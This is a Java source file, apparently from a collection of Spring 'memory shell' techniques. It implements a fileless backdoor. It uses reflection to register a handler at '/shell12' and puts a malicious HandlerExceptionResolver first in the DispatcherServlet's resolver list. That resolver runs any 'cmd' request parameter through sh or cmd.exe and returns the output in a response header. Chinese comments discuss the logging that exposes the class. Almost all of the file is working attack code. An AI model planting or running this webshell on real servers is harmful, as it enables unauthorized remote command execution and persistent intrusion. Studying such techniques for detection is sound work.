package com.example.springshell.memshell;

import com.example.springshell.Index;
import com.example.springshell.utils.Util;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.HandlerExceptionResolver;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

// 此内存马命令执行一次控制台就会至少报错两次，其中一次会直接暴露此恶意类名称，慎用
// 实际业务中可能不会报错，不报错则注入则无法使用
public class No12_HandlerExceptionResolverShell implements HandlerExceptionResolver {
    public static String injectShell() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        WebApplicationContext webApplicationContext = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        BeanNameUrlHandlerMapping beanNameUrlHandlerMapping = webApplicationContext.getBean(BeanNameUrlHandlerMapping.class);
        Class abstractUrlHandlerMapping = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping");
        Field field = abstractUrlHandlerMapping.getDeclaredField("handlerMap");
        field.setAccessible(true);

        // 因为 put 的对象没实现 Controller 接口，所以没有默认的 Adapter 可以处理，导致报错 No adapter for handler ，最后进入处理报错的分支处理 HandlerExceptionResolver
        Map handlerMap = (Map) field.get(beanNameUrlHandlerMapping);
        handlerMap.put("/shell12",new Index());

        DispatcherServlet servlet = new Util().getServlet();
        List<HandlerExceptionResolver> handlerExceptionResolvers = (List<HandlerExceptionResolver>) Util.getFieldValue(servlet,"handlerExceptionResolvers");
        handlerExceptionResolvers.add(0,new No12_HandlerExceptionResolverShell());

//        for (HandlerExceptionResolver handlerExceptionResolver : handlerExceptionResolvers) {
//            System.out.println(handlerExceptionResolver);
//        }

        return "{\"result\":\"No12_HandlerExceptionResolverShell\"}";
    }

    @Override
    public ModelAndView resolveException(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) {
        String cmd = request.getParameter("cmd");
        if (cmd!=null  && !cmd.isEmpty()){
            try {
                boolean islinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    islinux = false;
                }
                String[] cmds = islinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = null;
                in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
//                response.setHeader("Exec-result",new String(Base64.getEncoder().encode(output.getBytes())));
                response.setHeader("Exec-result", new String(output));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        return null;
    }
}
